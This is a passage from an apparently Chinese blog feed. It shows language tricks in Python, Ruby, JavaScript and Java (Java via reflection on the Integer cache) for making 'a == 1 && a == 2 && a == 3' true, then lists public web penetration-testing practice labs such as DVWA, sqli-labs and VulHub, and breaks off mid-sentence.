class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> num<span class="token punctuation">)</span> <span class="token punctuation">:</span>        self<span class="token punctuation">.</span>num <span class="token operator">=</span> num    <span class="token keyword">def</span> <span class="token function">__eq__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> num<span class="token punctuation">)</span> <span class="token punctuation">:</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>num <span class="token operator">&lt;=</span> num<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">:</span>    a <span class="token operator">=</span> NumOP<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">and</span> a <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">and</span> a <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"impossable!"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span> <span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"It's right."</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span> <span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h2><p>而对于 ruby 则可以利用它的一个语法糖简单实现：调用函数函数时，其参数列表可以不写括号。</p><p>那么只需要定义一个无入参的函数 <code>a</code> ，根据条件动态控制函数 <code>a</code> 的返回值即可，其实现代码如下：</p><pre class="line-numbers language-ruby"><code class="language-ruby"><span class="token keyword">def</span> a    <span class="token variable">$i</span> <span class="token operator">||</span><span class="token operator">=</span> <span class="token number">0</span>    <span class="token comment" spellcheck="true"># $i 是全局变量</span>    <span class="token variable">$i</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">end</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span>    puts <span class="token string">"impossable!"</span><span class="token keyword">else</span>    puts <span class="token string">"It's right."</span><span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h2><p>对于 JavaScript ，可以利用运算符 <code>==</code> 的松散相等特性：当 <code>==</code> 两边操作数的类型不相同时， JS 引擎会尝试把其中一个操作数类型转换成另一个操作数类型。</p><p>在这题里面，若左侧操作数 <code>a</code> 是对象，右侧是数字，则会隐式调用对象 <code>a</code> 的 <code>valueOf</code> 方法将其转换成数字；若转换失败则调用 <code>toString</code> 方法后再将其转换成数字。</p><p>显然，只需要控制 <code>valueOf</code> 逻辑使其满足每次 <code>==</code> 的判定即可，其实现代码如下：</p><blockquote><p>注：此方法对于严格相等运算符 <code>===</code> 不起作用。</p></blockquote><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token punctuation">{</span>    i<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>     valueOf<span class="token punctuation">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>i<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"impossable!"</span><span class="token punctuation">)</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"It's right."</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><p>这么多语言中，最麻烦的就是 Java 了。主要是 Java 不允许重写运算符，只能利用 <code>a</code> 做文章。</p><p>但 Java 要求 <code>==</code> 两边类型一致，而右侧的 <code>1</code>/<code>2</code>/<code>3</code> 是 <code>int</code> 基础类型，因此 <code>a</code> 会受到 Java 的 <strong>编译语法</strong> 约束，只可能是 <code>int</code> 基础类型或其包装类 <code>Integer</code>。而结合本题来看，<code>a</code> 只可能是 <code>Integer</code> 对象。</p><p>根据 Java 的语言特性，<code>Integer == int</code> 在比对之前，会自动拆包使得两边的类型一致，事实上会变成 <code>Integer.intValue() == int</code>。</p><p>理论上本应只需要重写 <code>Integer.intValue()</code> 即可。</p><p>而事实上 <code>Integer</code> 声明了 <code>final</code>，不允许被继承，直接导致无法重写 <code>Integer.intValue()</code>。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name">Integer</span> <span class="token keyword">extends</span> <span class="token class-name">Number</span> <span class="token keyword">implements</span> <span class="token class-name">Comparable</span><span class="token operator">&lt;</span>Integer<span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">intValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> value<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>换言之无法直接实现。</p><p>但是若条件变更如下，则有可能实现：</p><pre class="line-numbers language-java"><code class="language-java">a <span class="token operator">==</span> <span class="token punctuation">(</span>Integer<span class="token punctuation">)</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token punctuation">(</span>Integer<span class="token punctuation">)</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token punctuation">(</span>Integer<span class="token punctuation">)</span> <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>该条件比对的是 <code>Integer == Integer</code>，由于两侧操作数均是对象，实际比对的是对象地址的引用，只需要想办法篡改两个引用的对象（使其相同）即可达到目的。</p><hr><p>此时可以利用 Java【静态缓存】的特性 —— <code>Integer</code> 为了优化空间和效率，对于特定范围的常量值会放入常量池：</p><ul><li>当 <code>Integer</code> 类 <strong>第一次</strong> 被载入内存时，会通过内部类 <code>IntegerCache</code> 把 <code>[-128, 127]</code> 范围内的整数包装成 <code>Integer</code> 对象并缓存到 <code>Integer cache[]</code> 数组。</li><li>以后再用 <code>Integer</code> 初始化变量时，若其赋值范围在 <code>[-128, 127]</code> 之间，则直接返回 <code>cache</code> 数组中对应的引用，不再重新开辟内存。</li></ul><p>详细可见 <code>Integer</code> 的源码：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name">Integer</span> <span class="token keyword">extends</span> <span class="token class-name">Number</span> <span class="token keyword">implements</span> <span class="token class-name">Comparable</span><span class="token operator">&lt;</span>Integer<span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">IntegerCache</span> <span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> low <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">128</span><span class="token punctuation">;</span>        <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> high<span class="token punctuation">;</span>        <span class="token keyword">static</span> <span class="token keyword">final</span> Integer cache<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">static</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// high value may be configured by property</span>            <span class="token keyword">int</span> h <span class="token operator">=</span> <span class="token number">127</span><span class="token punctuation">;</span>            String integerCacheHighPropValue <span class="token operator">=</span>                VM<span class="token punctuation">.</span><span class="token function">getSavedProperty</span><span class="token punctuation">(</span><span class="token string">"java.lang.Integer.IntegerCache.high"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>integerCacheHighPropValue <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">try</span> <span class="token punctuation">{</span>                    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>integerCacheHighPropValue<span class="token punctuation">)</span><span class="token punctuation">;</span>                    i <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">// Maximum array size is Integer.MAX_VALUE</span>                    h <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> Integer<span class="token punctuation">.</span>MAX_VALUE <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token operator">-</span>low<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span> NumberFormatException nfe<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token comment" spellcheck="true">// If the property cannot be parsed into an int, ignore it.</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            high <span class="token operator">=</span> h<span class="token punctuation">;</span>            cache <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Integer</span><span class="token punctuation">[</span><span class="token punctuation">(</span>high <span class="token operator">-</span> low<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> j <span class="token operator">=</span> low<span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> cache<span class="token punctuation">.</span>length<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span>                cache<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Integer</span><span class="token punctuation">(</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// range [-128, 127] must be interned (JLS7 5.1.7)</span>            <span class="token keyword">assert</span> IntegerCache<span class="token punctuation">.</span>high <span class="token operator">>=</span> <span class="token number">127</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token function">IntegerCache</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * Returns an {@code Integer} instance representing the specified     * {@code int} value.  If a new {@code Integer} instance is not     * required, this method should generally be used in preference to     * the constructor {@link #Integer(int)}, as this method is likely     * to yield significantly better space and time performance by     * caching frequently requested values.     *     * This method will always cache values in the range -128 to 127,     * inclusive, and may cache other values outside of this range.     *     * @param  i an {@code int} value.     * @return an {@code Integer} instance representing {@code i}.     * @since  1.5     */</span>    <span class="token annotation punctuation">@HotSpotIntrinsicCandidate</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> Integer <span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">>=</span> IntegerCache<span class="token punctuation">.</span>low <span class="token operator">&amp;&amp;</span> i <span class="token operator">&lt;=</span> IntegerCache<span class="token punctuation">.</span>high<span class="token punctuation">)</span>            <span class="token keyword">return</span> IntegerCache<span class="token punctuation">.</span>cache<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token operator">-</span>IntegerCache<span class="token punctuation">.</span>low<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Integer</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>回到这题判断条件中的 <code>1</code>/<code>2</code>/<code>3</code>，因为是通过计算在 <code>IntegerCache</code> 数组索引，从而获取其包装类对象：</p><ul><li><code>(Integer) 1 =&gt; Integer.valueOf(1) =&gt; IntegerCache.cache[129]</code></li><li><code>(Integer) 2 =&gt; Integer.valueOf(2) =&gt; IntegerCache.cache[130]</code></li><li><code>(Integer) 3 =&gt; Integer.valueOf(3) =&gt; IntegerCache.cache[131]</code></li></ul><p>那么只需要篡改 <code>IntegerCache</code> 数组，使得：</p><ul><li><code>IntegerCache.cache[130] = IntegerCache.cache[129]</code></li><li><code>IntegerCache.cache[131] = IntegerCache.cache[129]</code></li></ul><p>就可以令 <code>1</code>/<code>2</code>/<code>3</code> 取得的包装类是同一个对象（此时的 <code>1</code>/<code>2</code>/<code>3</code> 纯粹就是索引值）。</p><p>篡改方法可以用例 Java 的反射机制：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>atomic<span class="token punctuation">.</span>AtomicInteger<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Java</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 利用反射机制获取 Integer cache[] 数组</span>        Class <span class="token class-name">clazz</span> <span class="token operator">=</span> Integer<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        Field field <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"cache"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Integer<span class="token punctuation">[</span><span class="token punctuation">]</span> cache <span class="token operator">=</span> <span class="token punctuation">(</span>Integer<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">;</span>        cache<span class="token punctuation">[</span><span class="token number">130</span><span class="token punctuation">]</span> <span class="token operator">=</span> cache<span class="token punctuation">[</span><span class="token number">129</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 令 (Integer) 2 = (Integer) 1</span>        cache<span class="token punctuation">[</span><span class="token number">131</span><span class="token punctuation">]</span> <span class="token operator">=</span> cache<span class="token punctuation">[</span><span class="token number">129</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 令 (Integer) 3 = (Integer) 1</span>        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Integer a <span class="token operator">=</span> Integer<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token punctuation">(</span>Integer<span class="token punctuation">)</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token punctuation">(</span>Integer<span class="token punctuation">)</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token punctuation">(</span>Integer<span class="token punctuation">)</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"impossable!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"It's right."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>但是这种做法不够优雅，毕竟改了题目。</p><p>那有没有不改题目的实现方式呢？</p><p>是有的。</p><p>虽然 <code>Integer</code> 声明了 <code>final</code>，不允许被继承，导致无法重写 <code>Integer.intValue()</code>。</p><p>但是可以利用 AOP 切到 <code>Integer.intValue()</code> 方法进行篡改。</p><p>在 Stack Overflow 就有人给出了类似的解题思路（理论上是可行的，但我并没有去验证，有兴趣的同学可以试试）：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>atomic<span class="token punctuation">.</span>AtomicInteger<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span>Before<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span>Test<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span>runner<span class="token punctuation">.</span>RunWith<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>powermock<span class="token punctuation">.</span>core<span class="token punctuation">.</span>classloader<span class="token punctuation">.</span>annotations<span class="token punctuation">.</span>PrepareForTest<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>powermock<span class="token punctuation">.</span>modules<span class="token punctuation">.</span>junit4<span class="token punctuation">.</span>PowerMockRunner<span class="token punctuation">;</span><span class="token annotation punctuation">@PrepareForTest</span><span class="token punctuation">(</span>Integer<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token annotation punctuation">@RunWith</span><span class="token punctuation">(</span>PowerMockRunner<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestJava</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/**     * 利用 AOP 把 Integer.intValue() 替换为 AtomicInteger.getAndIncrement()     */</span>    <span class="token annotation punctuation">@Before</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">before</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        AtomicInteger ai <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicInteger</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 自增整数</span>        <span class="token function">replace</span><span class="token punctuation">(</span><span class="token function">method</span><span class="token punctuation">(</span>Integer<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token string">"intValue"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">with</span><span class="token punctuation">(</span>                <span class="token punctuation">(</span>proxy<span class="token punctuation">,</span> method<span class="token punctuation">,</span> args<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> ai<span class="token punctuation">.</span><span class="token function">getAndIncrement</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">// lambda</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Test</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        Integer a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"impossable!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"It's right."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="幕间"><a href="#幕间" class="headerlink" title="幕间"></a>幕间</h2><p>通过前面的解题过程可以发现，弱类型语言 相较于 强类型语言 会更容易实现底层逻辑篡改，主要是因为对语法特性的校验会更宽松。</p><blockquote><p>C++ 虽然和 Java 一样属于强类型语言，但是因为没有限制运算符重写而被钻了空子</p></blockquote><p>在渗透测试中，或者可以利用类似的手段，绕过一些条件语句达到目的。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 永假式 </tag>
            
            <tag> 绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB 渗透靶场整合</title>
      <link href="/articles/safe/web-shen-tou-ba-chang-zheng-he/"/>
      <url>/articles/safe/web-shen-tou-ba-chang-zheng-he/</url>
      
        <content type="html"><![CDATA[<h2 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h2><p>推荐新手首选靶场，配置简单，需下载 phpstudy 和靶场文件包，简单部署之后即可访问。</p><p>包含了常见的web漏洞（php的），每个漏洞分为四个等级，每个等级都有源码查看，最高等级的源码是最安全的。</p><ul><li>DVWA靶场源码下载：<a href="http://www.dvwa.co.uk/index.php">http://www.dvwa.co.uk/index.php</a></li><li>phpstudy官方下载：<a href="https://m.xp.cn/">https://m.xp.cn/</a></li></ul><h2 id="网络安全实验室"><a href="#网络安全实验室" class="headerlink" title="网络安全实验室"></a>网络安全实验室</h2><p>做题的靶场，也是一个基础靶场，是一个在线的靶场。</p><ul><li>地址：<a href="http://hackinglab.cn/">http://hackinglab.cn/</a></li></ul><h2 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h2><p>sqli-labs 包含了大多数的 sql 注入类型，以一种闯关模式，对于 sql 注入进行漏洞利用。</p><p>sql 注入练习首选，同样需要 phpstudy （或者 amp 环境）加靶场源码包部署。</p><ul><li>sqli-labs 靶场源码下载：<a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></li></ul><h2 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a>upload-labs</h2><p>upload-labs 包含了大多数文件上传类型，一个包含几乎所有类型上传漏洞的靶场。</p><p>目前更新到 20 关。</p><ul><li>靶场源码下载地址：<a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></li></ul><h2 id="xss-challenges"><a href="#xss-challenges" class="headerlink" title="xss challenges"></a>xss challenges</h2><p>xsschallenges 是一个专对于 XSS 漏洞练习的的靶场，包含了各种绕过，各种姿势的 XSS 利用。</p><ul><li>在线靶场地址：<a href="http://xss-quiz.int21h.jp/">http://xss-quiz.int21h.jp/</a></li></ul><h2 id="必火网络安全-必火靶机三"><a href="#必火网络安全-必火靶机三" class="headerlink" title="必火网络安全-必火靶机三"></a>必火网络安全-必火靶机三</h2><p>这个在线靶场涵盖了大多数的 Web 漏洞，跟 DVWA 的机制差不多，还有 CTF 题可做，个人认为是一个比较全的一个 Web 漏洞靶场。</p><ul><li>在线靶场地址：<a href="https://www.bihuoedu.com/">https://www.bihuoedu.com/</a></li></ul><h2 id="OWASP-Broken-Web-Applications-Project"><a href="#OWASP-Broken-Web-Applications-Project" class="headerlink" title="OWASP Broken Web Applications Project"></a>OWASP Broken Web Applications Project</h2><p>靶场由 OWASP 专门为 Web 安全研究者和初学者开发的一个靶场，包含了大量存在已知安全漏洞的训练实验环境和真实 Web 应用程序。</p><p>靶场在官网下载后是一个集成虚拟机，可以直接在 vm 中打开，物理机访问 ip 即可访问到 web 平台，使用 root/owaspbwa 登入就会返回靶场地址，直接可以访问靶场。</p><p>DVWA 适合了解漏洞和简单的漏洞利用，owaspbwa 则就更贴近实际的复杂的业务环境。</p><ul><li>靶场虚拟机下载地址：<a href="https://sourceforge.net/projects/owaspbwa/">https://sourceforge.net/projects/owaspbwa/</a></li></ul><h2 id="VulHub"><a href="#VulHub" class="headerlink" title="VulHub"></a>VulHub</h2><p>这是一个开源的漏洞环境项目，包含了很多不同的环境，是继 owaspbwa 以后，漏洞种类多，环境丰富的一个靶场，并且收集的漏洞也比较新，适合作为一个长期的学习、实战靶场。</p><p>Vulhub 是一个基于 docker 和 docker-compose 的漏洞环境集合，需要在 linux 下安装 docker，有 docker 环境之后，即可一条语句启动一个漏洞环境。</p><ul><li>vulhub 指导安装地址：<a href="https://vulhub.org/">https://vulhub.org/</a></li></ul><h2 id="vulnhub"><a href="#vulnhub" class="headerlink" title="vulnhub"></a>vulnhub</h2><p>Vulnhub 是一个提供各种漏洞环境的靶场平台，供安全爱好者学习渗透使用，大部分环境是做好的虚拟机镜像文件，镜像预先设计了多种漏洞，需要使用 VMware 或者 VirtualBox 运行。</p><p>每个镜像会有破解的目标，大多是 